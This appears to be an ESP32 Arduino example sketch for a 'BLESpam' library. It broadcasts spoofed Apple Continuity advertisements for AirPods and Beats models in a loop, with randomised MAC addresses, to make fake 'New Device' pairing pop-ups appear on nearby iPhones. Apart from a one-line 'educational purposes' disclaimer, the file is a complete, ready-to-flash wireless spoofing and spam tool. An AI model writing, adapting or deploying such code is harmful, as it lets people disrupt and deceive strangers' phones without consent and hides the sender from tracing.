/**
 * AppleBLESpam Example
 * 
 * This example demonstrates how to use the BLESpam library to create
 * Apple Continuity "New Device" popups on nearby iOS devices.
 * 
 * Compatible with ESP32 boards
 * 
 * DISCLAIMER: This is for educational purposes only. Use responsibly.
 */

#include <BLESpam.h>

BLESpam bleSpam;

// Array of Apple devices to cycle through
AppleDeviceType devices[] = {
    AIRPODS_PRO,
    AIRPODS_MAX,
    AIRPODS_GEN3,
    AIRPODS_PRO_GEN2,
    BEATS_STUDIO_BUDS,
    POWERBEATS_PRO
};

int numDevices = sizeof(devices) / sizeof(AppleDeviceType);
int currentDevice = 0;

void setup() {
    Serial.begin(115200);
    Serial.println("BLESpam - Apple Device Spam Example");
    Serial.println("====================================");
    
    // Initialize the BLE spam library
    if (!bleSpam.begin("ESP32-BLE")) {
        Serial.println("Failed to initialize BLE!");
        while(1) delay(1000);
    }
    
    Serial.println("BLE initialized successfully!");
    
    // Configure advertising parameters
    bleSpam.setAdvertisingInterval(100); // 100ms interval
    bleSpam.setTxPower(3);               // 3 dBm power
    bleSpam.setRandomMac(true);          // Use random MAC address
    
    Serial.println("Starting Apple device advertisements...");
}

void loop() {
    // Get device name
    const char* deviceName = "Unknown";
    for (int i = 0; i < appleDevicesCount; i++) {
        if (appleDevices[i].type == devices[currentDevice]) {
            deviceName = appleDevices[i].name;
            break;
        }
    }
    
    // Advertise current device
    Serial.print("Advertising: ");
    Serial.println(deviceName);
    bleSpam.advertiseAppleDevice(devices[currentDevice]);
    
    // Wait 5 seconds
    delay(5000);
    
    // Move to next device
    currentDevice = (currentDevice + 1) % numDevices;
    
    // Stop advertising before switching
    bleSpam.stop();
    delay(100);
}
